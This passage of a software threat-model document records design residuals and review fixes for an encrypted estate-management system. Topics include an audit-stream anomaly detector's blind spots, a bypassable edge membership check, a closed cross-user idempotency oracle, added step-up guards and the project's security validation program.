- The stack e2e's gate pairs a POSITIVE control with the false-positive
  assertion: a deliberate burst past the smallest bound must produce exactly
  its own anomaly, and every anomaly in the store must name that deliberate
  bound. A bare zero-events assertion would be vacuously green over a dead
  detector — the M8 dead-consumer shape.

**The window's clock, and what that costs (M18 PR3).** The sweep selects
`occurred_at >= now - 300s`, and `occurred_at` is stamped by the PRODUCING
service at emit time — the ingestor preserves it, and `audit_events` has no
server-authored ingest-time column. Three consequences, recorded rather than
patched, because the honest fix is a schema change (an ingest-time column, or
windowing on the ingest-ordered `seq`) that belongs to the milestone that
needs it:
- Ingest lag or an audit-service outage longer than the window means the
  backlog arrives already outside every future tick's window and is never
  evaluated. The consumer and the detector are one process, so this is
  exactly the state a detector most needs to survive. Fail direction: a
  MISSED alarm, never a false one.
- A producing service whose clock is more than a window slow has its decrypts
  permanently outside the window — that service's prefixes go dark with no
  fault and no log.
- A far-future `occurred_at` is counted in every window indefinitely, and its
  episode never clears, so that principal's later genuine anomalies are
  suppressed. Authoring one needs a grossly misconfigured clock or the
  ability to forge topic messages — a strictly larger break than the §5.3
  adversary this control is credited against.

**What the audit stream cannot see (M18 PR3).** "Every released plaintext is
one audited event" is a property of code that goes THROUGH `FieldCrypto`. The
package also exports the AEAD `open()` and the KMS unwrap, and a Zone B
process holds unwrapped DEKs in a 5-minute cache — so code executing INSIDE a
compromised service (RCE, a malicious dependency, a malicious-insider deploy)
can decrypt without emitting anything, and the DEK cache means it need not
call KMS either. That tier is not what this detector is for: it is the
credential/identity-compromise case that drives the ordinary API, and against
in-process compromise the answers are the enforcement chokepoint (the KMS
grant), image signing and admission control, and §5.3's canaries. §5.3's
control text should be read with that boundary in mind.

**What remains cloud-blocked, stated precisely:** the ENFORCEMENT half —
suspending the KMS grant and paging — needs real IAM and a TB7 operator;
KMS-side rate limiting still bounds bulk UNWRAPS (many-user sweeps), which
the DEK cache never hid; §5.3's canaries and CloudHSM roots are unchanged.

**The detector's own session (M18 PR3).** It is lazily connected, absorbs
connection-level `error` events, and replaces a dead session on the next
tick. Each of those is a review finding rather than a nicety: an unhandled pg
`error` event crashes the whole audit process (reproduced against a real
cluster), which would have let the ADVISORY detector kill INGEST — the paging
signal — and an error listener alone would have traded that crash for
permanent silent deafness, since a pg Client never reconnects. The session
also carries a query timeout, without which a black-holed socket leaves the
re-entrancy guard latched for hours with nothing logged (the M8
dead-consumer shape). The INGEST connection deliberately keeps the opposite
posture: its death is fatal, and it now routes through the service's fatal
path instead of an uncaught exception, so it dies with a structured line and
releases its handles.

**Coverage gap, stated (M18 PR3).** The stack e2e's false-positive gate runs
in the DEVELOPMENT profile only, so the production rehearsal's journey —
escrow arming, settlement intake, vault enrollment under production config —
runs with a live detector and no anomaly assertion over it. Nothing in that
journey reaches a decrypt class the dev journey does not, which is why this
is recorded rather than duplicated; a production-only decrypt path arriving
later owes the gate a second home.

## 6r. Threat-model delta — M19 the assets surface (2026-08-13)

M19 put the product's first owner-facing surface on the oldest domain
service in the repo. PR1's service hardening (the uniform 404 closing the
404-vs-403 oracle on every asset-scoped path, the list narrowed to one
decrypt per row) and the repo-wide route↔consumer fence are recorded in
docs/04; what belongs HERE is what the ceremony surface (PR3) changes about
the model and what it deliberately leaves open.

**The BFF membership check is best-effort hygiene at the edge, not a
security control, and a direct-API caller walks past it.** Designating a
beneficiary crosses two clusters — the designation lives in the financial
cluster, the contact in core — and docs/02 §8 forbids a cross-cluster FK,
so nothing in the database can make `asset_beneficiaries.contact_id` name a
real contact. The BFF refuses a designate whose contactId is not among the
caller's own contacts, because it is the only layer holding both clients on
the caller's own bearer. A caller speaking to the assets service directly
(any valid session; the service is CallerGuard + StepUpGuard) can still
mint a designation naming any UUID. What bounds it: the designation is in
the caller's OWN estate (Cedar scopes every asset route to the owner), it
directs nothing anywhere (no beneficiary visibility exists — below), the
dangling row renders honestly in the product ("No longer in your contacts")
and stays removable because remove is deliberately unchecked. Closing it
for real means either a projection of contact ids into the financial
cluster (a new consistency surface) or assets consulting profile
server-side (a new credential edge for a hygiene property) — neither is
worth its cost today, and this paragraph is the record of that decision.

**A designation is not access, and the surface says so out loud.** Naming a
beneficiary writes a ledger event and a projection row; it grants no read,
no notification, no visibility of any kind. docs/00 §5.5's "beneficiaries
see only assets naming them" remains UNBUILT — `namedBeneficiaries`
resolution requires the contact-link projection (M13's ceremony provides
the link; no milestone has yet joined it to designations), and until then a
beneficiary structurally cannot learn they were named. The ceremony's copy
carries both truths so an owner does not mistake a designation for an
arrangement anyone else can see. The share-sum constraint
(`share_sum_exceeded`, the repo's one CONSTRAINT TRIGGER) is enforced
per-class in the service and surfaced as its own refusal.

**The step-up retry loop spends decrypts during the propagation window,
and the spend is attributed to the owner themselves.** A step-up-refused
designate re-runs the full mutation while the peer's 30s session cache is
stale (the M13 prompt-and-retry contract), and each retry re-runs the BFF's
membership check — one contacts load, one audited decrypt per contact name
— before assets refuses downstream. MEASURED against the running stack for
one designation on a one-contact estate: five `contact.name` decrypts in
total — one for the picker, THREE membership checks (the refused attempt
plus two retry polls, the elevation propagating on the second), and one for
the name composition on reload. **THE SPEND SCALES WITH THE CONTACT BOOK, NOT
THE DESIGNATION COUNT** — the resolver loads every contact the owner has —
so the five above is a one-contact figure and the M19 PR4 review corrected
the conclusion drawn from it: the theoretical worst case is ~17 polls
across the 35s propagation budget times the whole address book, which for a
50-contact estate is order 850 `contact.name` decrypts and NOT "far under"
the M18 `contact/user` bound of 160/min. It remains self-inflicted (the
owner's own session, on their own trail, only while retrying a step-up they
initiated), which is why the bound firing there is a true positive worth
seeing rather than a false alarm to design around. Recorded rather than
re-engineered: every alternative either duplicates the freshness gate at
the edge (a second copy that drifts) or adds a client-controllable skip
flag to a check whose absence is already a recorded residual (above).

### What the PR4 review changed about the model

**A deletion-class verb had no second factor, and PR2 gave it a button.**
Retirement is the assets service's one IRREVERSIBLE command — every other
command appends a correction, and even a removed designation leaves its
history — so docs/01 §5's "deletion requests" covers it, as assets' own
beneficiary route has complied since M3. It shipped in M3 under `CallerGuard`
alone and nothing revisited it, which was dormant while no client existed and
live the moment M19 PR2 put Retire on screen: a stolen bearer could have
retired an estate's assets one at a time without ever proving a factor.
Closed with `StepUpGuard`, and the route's gate class is now DECLARED AS DATA
and checked against Nest's RUNTIME route metadata, so a future route arrives
with a gate decision or the build fails. **Residual, stated rather than
implied: that fence covers the assets service only.** The other eight services
have no equivalent, and their step-up coverage is still whatever their
controllers happen to say — generalising it is a change to eight services and
belongs to whichever milestone next touches them.

**A globally-unique idempotency index was a cross-user event-existence
oracle.** `asset_events.event_id` was UNIQUE across the whole table and the
lookup carried no owner predicate, so submitting an id belonging to somebody
else answered 409 where an unused id answered 201 — measured live. Because the
ids are CLIENT-generated by design (that is what makes a retry a no-op), an
observed id is a probe. Scoped to `(user_id, event_id)`, and the lookup now
carries the owner, so a foreign id is byte-identical to an unused one. The
owner's own replay still answers 409, which is the feature rather than a leak.

**The version read now fails CLOSED, and that has a price worth naming.** A
projection row and its latest ledger seq were read in separate pool queries —
separate snapshots — with the row first, so a command landing between them
paired OLD state with a NEW version and the caller's next `If-Match` passed
against state they had never seen. That is a silent lost update. Reversed, the
same race pairs new state with an old version and the write is refused with a
409 the surface already handles by re-reading. The cost is real and accepted:
a reader unlucky in that window is told to reload when nothing was wrong with
what they had. Failing closed on a write is the correct side of that trade,
and it is the only side that cannot silently discard someone's edit.

**A rate bound read as an outage.** Identity's step-up cap answers 429
`too_many_attempts`; the BFF had no mapping, so a control firing exactly as
designed surfaced as "something went wrong on our side" (§6k's bound, §6j's
lesson, arriving on the assets surface because M19 put two step-up ceremonies
there). It has its own code and its own copy now — the only refusal in the
union whose remedy is to WAIT rather than to act differently, which is
precisely why it must not borrow the credential code's "enter the current
code" wording. The copy deliberately does not state the window in minutes:
that number is a reviewed constant in a service the web app cannot import, and
a figure people plan around must not be a second copy free to drift.

## 7. Validation program

- **Continuous:** SAST/DAST/dependency scanning in CI; fuzzing on parsers (document ingest, OCR, webhook handlers); secrets scanning; IaC policy checks (tfsec/OPA).
- **Quarterly:** External penetration test rotating focus (auth → vault → settlement → APIs); purple-team exercise against one §5 scenario.
- **Annually:** Full red team including social engineering of the settlement flow; SOC 2 Type II audit; DR failover game day; threat-model refresh.
- **Always-on:** Public bug bounty with elevated payouts for Zone A and settlement-flow findings.
